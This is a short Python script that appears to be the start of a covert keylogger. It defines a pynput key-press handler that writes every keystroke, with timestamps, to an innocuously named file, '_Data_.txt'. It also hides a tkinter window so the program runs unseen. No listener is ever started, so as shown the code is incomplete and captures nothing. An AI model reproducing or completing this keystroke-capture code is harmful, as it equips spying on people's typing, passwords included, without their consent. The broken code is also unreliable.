import pynput.keyboard
import logging
import tkinter as tk
import os




log_file = "_Data_.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')



root = tk.Tk()

root.withdraw()

root.mainloop()

